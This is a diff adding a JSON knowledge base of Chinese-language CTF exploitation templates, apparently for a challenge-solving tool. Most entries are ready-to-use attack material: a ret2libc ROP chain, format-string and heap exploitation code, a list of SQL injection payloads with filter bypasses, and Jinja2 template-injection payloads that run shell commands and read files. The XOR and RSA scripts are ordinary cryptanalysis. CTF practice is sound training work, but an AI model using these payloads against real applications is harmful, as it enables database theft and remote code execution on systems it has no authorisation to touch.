@@ -1,0 +1,116 @@
+{
+  "knowledge": [
+    {
+      "id": "ret2libc_basic",
+      "name": "ret2libc 基础利用",
+      "category": "pwn",
+      "description": "当 NX 保护开启时，无法直接执行栈上的 shellcode。可以通过 ret2libc 技术调用系统中的 libc 函数",
+      "template": "# ret2libc 利用模板\n# 1. 确定 libc 基址（通过泄露函数地址）\n# 2. 计算 system() 和 '/bin/sh' 地址\n# 3. 构造 ROP 链\n\nfrom pwn import *\n\n# 泄露 libc 地址\npayload = b'A' * offset\npayload += p64(pop_rdi)      # pop rdi; ret\npayload += p64(puts_got)     # 泄露 puts@got\npayload += p64(puts_plt)     # 调用 puts\npayload += p64(main_addr)    # 返回 main 再次利用\n\n# 计算 libc 基址\nlibc_base = leaked_puts - libc.symbols['puts']\nsystem_addr = libc_base + libc.symbols['system']\nbinsh_addr = libc_base + next(libc.search(b'/bin/sh'))\n\n# 最终 payload\npayload = b'A' * offset\npayload += p64(ret_gadget)   # 栈对齐\npayload += p64(pop_rdi)\npayload += p64(binsh_addr)\npayload += p64(system_addr)\n",
+      "keywords": [
+        "ret2libc",
+        "pwn",
+        "rop",
+        "nx",
+        "libc",
+        "system",
+        "缓冲区溢出"
+      ],
+      "example_usage": "适用于 NX 开启、有泄露点、已知 libc 版本的栈溢出题目"
+    },
+    {
+      "id": "sql_injection_basic",
+      "name": "SQL 注入基础",
+      "category": "web",
+      "description": "通过构造恶意 SQL 语句绕过认证或提取数据",
+      "template": "# SQL 注入常见 Payload\n\n# 1. 判断注入点\n' OR '1'='1\n' OR '1'='1'--\n' OR '1'='1'#\n1' AND '1'='1\n1' AND '1'='2\n\n# 2. 联合查询\n' UNION SELECT 1,2,3--\n' UNION SELECT null,null,null--\n' UNION SELECT username,password,null FROM users--\n\n# 3. 盲注\n' AND SUBSTRING(database(),1,1)='a'--\n' AND ASCII(SUBSTRING(database(),1,1))>97--\n' AND (SELECT COUNT(*) FROM users)>0--\n\n# 4. 报错注入\n' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--\n' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--\n\n# 5. 绕过技巧\n'/**/OR/**/1=1--     # 空格绕过\n'%0aOR%0a1=1--       # 换行绕过\n'/*!50000OR*/1=1--   # 内联注释绕过\n' UnIoN SeLeCt 1--    # 大小写绕过\n",
+      "keywords": [
+        "sql",
+        "注入",
+        "injection",
+        "union",
+        "盲注",
+        "web"
+      ],
+      "example_usage": "适用于登录绕过、数据提取、盲注等场景"
+    },
+    {
+      "id": "format_string",
+      "name": "格式化字符串漏洞",
+      "category": "pwn",
+      "description": "printf 等函数格式化字符串漏洞利用",
+      "template": "# 格式化字符串漏洞利用\n\nfrom pwn import *\n\n# 1. 确定偏移\npayload = b'AAAA.%p.%p.%p.%p.%p.%p.%p.%p'\n# 观察输出，找到 0x41414141 的位置\n\n# 2. 泄露栈上数据\npayload = b'%7$p'  # 泄露第 7 个参数\n\n# 3. 泄露任意地址\npayload = b'%7$s' + p64(target_addr)\n\n# 4. 写入任意地址（pwntools 自动化）\npayload = fmtstr_payload(offset, {target_addr: value})\n\n# 5. 覆盖 GOT 表\npayload = fmtstr_payload(offset, {printf_got: system_addr})\n\n# 6. 覆盖返回地址\npayload = fmtstr_payload(offset, {ret_addr: one_gadget})\n",
+      "keywords": [
+        "格式化字符串",
+        "format string",
+        "fsb",
+        "pwn",
+        "printf"
+      ],
+      "example_usage": "适用于 printf(user_input) 类型的漏洞"
+    },
+    {
+      "id": "xor_cipher",
+      "name": "XOR 解密",
+      "category": "crypto",
+      "description": "XOR 异或加密/解密",
+      "template": "# XOR 解密脚本\n\ndef xor_decrypt(data, key):\n    \"\"\"单字节或多字节 XOR 解密\"\"\"\n    if isinstance(key, int):\n        key = bytes([key])\n    result = []\n    for i, b in enumerate(data):\n        result.append(b ^ key[i % len(key)])\n    return bytes(result)\n\n# 常见 XOR 密钥猜测\ndef guess_xor_key(ciphertext):\n    \"\"\"通过频率分析猜测密钥\"\"\"\n    for key in range(256):\n        decrypted = xor_decrypt(ciphertext, key)\n        if b'flag' in decrypted.lower() or b'ctf' in decrypted.lower():\n            return key, decrypted\n    return None, None\n\n# 已知明文攻击\ndef known_plaintext_attack(ciphertext, known_plaintext):\n    \"\"\"已知明文恢复密钥\"\"\"\n    key = []\n    for i, c in enumerate(known_plaintext):\n        key.append(ciphertext[i] ^ ord(c))\n    return bytes(key)\n",
+      "keywords": [
+        "xor",
+        "异或",
+        "crypto",
+        "加密",
+        "解密"
+      ],
+      "example_usage": "适用于简单 XOR 加密的逆向或密码题"
+    },
+    {
+      "id": "rsa_attacks",
+      "name": "RSA 常见攻击",
+      "category": "crypto",
+      "description": "RSA 加密常见攻击方法",
+      "template": "# RSA 攻击脚本\n\nfrom Crypto.Util.number import *\nimport gmpy2\n\n# 1. 小指数攻击 (e=3)\ndef small_e_attack(c, e=3):\n    \"\"\"当 m^e < n 时直接开方\"\"\"\n    m = gmpy2.iroot(c, e)[0]\n    return int(m)\n\n# 2. 共模攻击\ndef common_modulus_attack(n, e1, e2, c1, c2):\n    \"\"\"同一消息用不同指数加密\"\"\"\n    from gmpy2 import gcdext\n    g, s1, s2 = gcdext(e1, e2)\n    if s1 < 0:\n        c1 = gmpy2.invert(c1, n)\n        s1 = -s1\n    if s2 < 0:\n        c2 = gmpy2.invert(c2, n)\n        s2 = -s2\n    m = (pow(c1, s1, n) * pow(c2, s2, n)) % n\n    return int(m)\n\n# 3. Wiener 攻击 (d 小)\ndef wiener_attack(n, e):\n    \"\"\"当 d < n^0.25 时可恢复私钥\"\"\"\n    from fractions import Fraction\n    cf = continued_fraction(e, n)\n    convergents = cf.convergents()\n    for conv in convergents:\n        k, d = conv.numerator, conv.denominator\n        if k == 0:\n            continue\n        phi = (e * d - 1) // k\n        b = n - phi + 1\n        delta = b * b - 4 * n\n        if delta >= 0:\n            sqrt_delta = gmpy2.isqrt(delta)\n            if sqrt_delta * sqrt_delta == delta:\n                return d\n    return None\n\n# 4. 分解 n (factordb)\n# 访问 factordb.com 或使用 yafu\n",
+      "keywords": [
+        "rsa",
+        "crypto",
+        "公钥",
+        "私钥",
+        "wiener",
+        "共模"
+      ],
+      "example_usage": "适用于 RSA 参数配置不当的密码题"
+    },
+    {
+      "id": "ssti_flask",
+      "name": "SSTI 模板注入",
+      "category": "web",
+      "description": "服务端模板注入漏洞利用",
+      "template": "# Flask Jinja2 SSTI Payload\n\n# 1. 检测\n{{7*7}}  # 返回 49 则存在漏洞\n\n# 2. 获取配置\n{{config}}\n{{self.__init__.__globals__}}\n\n# 3. 获取类\n{{''.__class__.__mro__[1].__subclasses__()}}\n\n# 4. RCE (找 subprocess.Popen 或 os._wrap_close)\n{{''.__class__.__mro__[2].__subclasses__()[40]('/bin/sh',shell=True,stdout=-1).communicate()}}\n\n# 5. 读取文件\n{{''.__class__.__mro__[2].__subclasses__()[40]('cat /flag',shell=True,stdout=-1).communicate()[0]}}\n\n# 6. 绕过过滤\n{{''['__cla''ss__']['__mr''o__']}}  # 拼接绕过\n{{request|attr('application')|attr('__globals__')}}  # attr 绕过\n{{lipsum.__globals__['os'].popen('id').read()}}  # lipsum 绕过\n",
+      "keywords": [
+        "ssti",
+        "模板注入",
+        "flask",
+        "jinja2",
+        "web",
+        "rce"
+      ],
+      "example_usage": "适用于 Flask/Jinja2 模板注入"
+    },
+    {
+      "id": "heap_overflow",
+      "name": "堆利用基础",
+      "category": "pwn",
+      "description": "堆溢出常见利用方法",
+      "template": "# 堆利用技术\n\nfrom pwn import *\n\n# 1. UAF (Use After Free)\nadd(0x20, b'AAAA')    # chunk 0\nfree(0)               # 释放\n# chunk 0 的指针未清空，仍可读写\n\n# 2. Double Free\nfree(0)\nfree(0)  # 或 free(1) 如果 0 和 1 指向同一地址\n\n# 3. Fastbin Attack\ntarget = 0x601000     # 目标地址附近\nadd(0x68, b'A'*0x68)  # fastbin 范围\nfree(0)\nedit(0, p64(target))  # 覆盖 fd\nadd(0x68, b'B'*0x68)  # 分配原 chunk\nadd(0x68, b'C'*0x68)  # 分配到 target 附近\n\n# 4. Unlink\n# 利用 unlink 宏修改指针\n\n# 5. House of Force\n# 覆盖 top chunk size 为 -1\n\n# 6. Tcache Attack (glibc 2.26+)\n# tcache 没有检查，更容易利用\n",
+      "keywords": [
+        "heap",
+        "堆",
+        "uaf",
+        "fastbin",
+        "tcache",
+        "pwn"
+      ],
+      "example_usage": "适用于堆溢出、UAF 等堆相关漏洞"
+    }
+  ],
+  "updated_at": "2026-04-03T21:37:12.523267"
+}
